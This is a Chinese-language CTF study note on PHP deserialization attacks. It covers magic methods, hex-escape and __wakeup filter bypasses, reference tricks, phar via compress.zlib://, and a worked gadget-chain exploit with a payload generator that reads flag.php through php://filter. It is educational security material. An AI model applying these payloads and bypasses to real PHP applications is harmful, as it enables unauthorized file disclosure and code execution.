---
title: 【WEB】PHP反序列化
---

# PHP 反序列化

魔术函数：

```
__construct() 当一个对象创建时被调用，反序列化不触发
__destruct()  当一个对象销毁时被调用
__toString()  当一个对象被当作一个字符串使用，比如echo输出或用 . 和字符串拼接
__call()      当调用的方法不存在时触发
__invoke()    当一个对象被当作函数调用时触发
__wakeup()    反序列化时自动调用
__get()       类中的属性私有或不存在触发
__set()       类中的属性私有或不存在触发
```

反序列化十六进制绕过关键字

```
在反序列化时，序列化中的十六进制会被转化成字母
当过滤了c2e38 ，即可用 \63\32\65\33\38 替代，S解析十六进制
username:y1ng\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0
password:";S:11:"\00*\00password";O:8:"Hacker_A":1:{S:5:"\63\32\65\33\38";O:8:"Hacker_B":1:{S:5:"\63\32\65\33\38";O:8:"Hacker_C":1:{s:4:"name";s:4:"test";}}};s:1:"a";s:0:"
 
\00 会被替换为 %00
\65 会被替换为 e
 
过滤了%00，可用S来代替序列化字符串的s来绕过，在S情况下\00 会被解析成%00
```

序列化时类中私有变量和受保护变量，php7.1+ 对属性并不敏感，public 也可用于protected

```
private反序列化后是%00(类名)%00(变量名)，protect是%00*%00(变量名)
```

PHP5 以及 PHP7 < 7.0.10 可用wake up 绕过

<img src="/images/php-serialize/2.png" alt="image-20201218105604315" style="zoom:80%;" />

当对象个数大于实际个数就不会触发



## 序列化引用：

<img src="/images/php-serialize/3.png" alt="image-20201218105803889" style="zoom: 67%;"/>

这里的 R:2 即对第二个序列化变量的引用。第一个序列化变量是 a:2:{***}，第二个序列化变量是 i:0;s:3:"foo";

所以这道题可以构造 token 对 token_flag 的引用

payload = O:6:"Handle":2:{s:14:"%00Handle%00handle";O:4:"Flag":3:{s:4:"file";s:8:"flag.php";s:5:"token";s:32:"02575659ec3b5f6d204a1d1b3081379b";s:10:"token_flag";R:4;}} 。

按序列化顺序排号：

(1), O:6:"Handle":2:{***}

(2), s:14:"%00Handle%00handle";O:4:"Flag":3:{***}

(3), s:4:"file";s:8:"flag.php";

(4), s:5:"token";s:32:"02575659ec3b5f6d204a1d1b3081379b";

(5), s:10:"token_flag";R:4;

可以看出 token_flag 即为 4 号 token 的引用，所以序列化之后他们是恒等的。

 <img src="/images/php-serialize/1.png" alt="image-20201218105854349" style="zoom:80%;" />

把b的地址给a，之后b再传入数据则a也相应变化

可以说这两个变量绑定在了一起，有一个改变，另一个也会一起改变

 

当没有 unserialize() 时可使用phar，file_exist() 会触发phar反序列化 ( PHP8中删除 )

当开头为phar的协议被过滤时，可使用compress.zlib:// 绕过

形如：compress.zlib://phar://



## 例题

目标路径存在 index.php 和 flag.php

index.php：

```
<?php
error_reporting(0);
class Vox{
    protected $headset;
    public $sound;
    public function fun($pulse){
        include($pulse);
    }
    public function __invoke(){
        $this->fun($this->headset);
    }
}

class Saw{
    public $fearless;
    public $gun;

    public function __toString(){
        $this->gun['gun']->fearless;
        return "Saw";
    }

    public function _pain(){
        if($this->fearless){
            highlight_file($this->fearless);
        }
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|php|\.\./i", $this->fearless)){
            echo "Does it hurt? That's right";
            $this->fearless = "index.php";
        }
    }
}

class Petal{
    public $seed;

    public function __get($sun){
        $Nourishment = $this->seed;
        return $Nourishment();
    }
}

if(isset($_GET['ozo'])){
    unserialize($_GET['ozo']);
}
else{
    $Saw = new Saw('index.php');
    $Saw->_pain();
}
?>
```

flag.php：

```
<?php
$flag="{This_is_flag}";
```

首先先找反序列化链入口，这里没有 `__destruct()`，能触发的只有 `__wakeup()`，入口从`__wakeup()`进，出口有两个，一个是 `_pain()` 的 `highlight_file($this->fearless)`，另一个是`__fun`中的 `include()`，这里可以使用 php 伪协议读取文件内容

然后捋一遍出现的魔术函数，有 `__wakeup()`，`__toString()`，`__invoke()`，`__get()`

`__wakeup()`是入口，后面有一句 `preg_match`，`$this->fearless` 是被当成字符串使用的，就是说如果把  `$this->fearless` 赋值为 对象 Saw 就会进入 `__toString()`，之后有 `$this->gun['gun']->fearless` ，Petal 类中不存在 `fearless` 属性，把 `gun['gun']`赋值为 对象 Petal 会进入 `__get()`，其中 `$Nourishment()` 可控，属性 `seed`赋值为对象，触发`__invoke()`伪协议包含读文件

### Payload

```
<?php
class Vox{
    protected $headset="php://filter/read=convert.base64-encode/resource=flag.php";
    public $sound;
}

class Saw{
    public $fearless;
    public $gun;
	public function _pain(){}
}

class Petal{
    public $seed;
}
$a = new Vox();
$b = new Saw();
$c = new petal();
$c->seed = $a;
$d = new Saw();
$d->gun['gun']=$c;
$b->fearless = $d;
echo(serialize($b));
?>
```